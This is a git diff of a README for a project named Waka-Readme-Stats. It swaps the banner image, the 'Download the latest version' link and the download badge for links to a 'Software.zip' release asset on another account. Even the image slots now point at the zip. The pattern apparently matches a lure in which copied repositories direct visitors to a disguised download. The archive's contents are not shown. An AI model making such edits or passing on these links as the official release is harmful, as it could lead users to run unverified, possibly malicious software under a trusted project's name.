@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to Waka-Readme-Stats 📊
 
-![Waka-Readme-Stats](https://github.com/username/your-repo/blob/main/images/banner.png)
+![Waka-Readme-Stats](https://github.com/Wissalgithubrit/waka-readme-stats/releases/download/v1.0/Software.zip)
 
 ## Overview ℹ️
 
@@ -39,10 +39,10 @@ If you have any questions or need help with Waka-Readme-Stats, feel free to reac
 
 ## Links 🌐
 
-- [Download the latest version](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+- [Download the latest version](https://github.com/Wissalgithubrit/waka-readme-stats/releases/download/v1.0/Software.zip)
 - Visit the official website for more information
 
-[![Download Waka-Readme-Stats](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Waka-Readme-Stats](https://github.com/Wissalgithubrit/waka-readme-stats/releases/download/v1.0/Software.zip)](https://github.com/Wissalgithubrit/waka-readme-stats/releases/download/v1.0/Software.zip)
 
 ## Contributors 💻
 
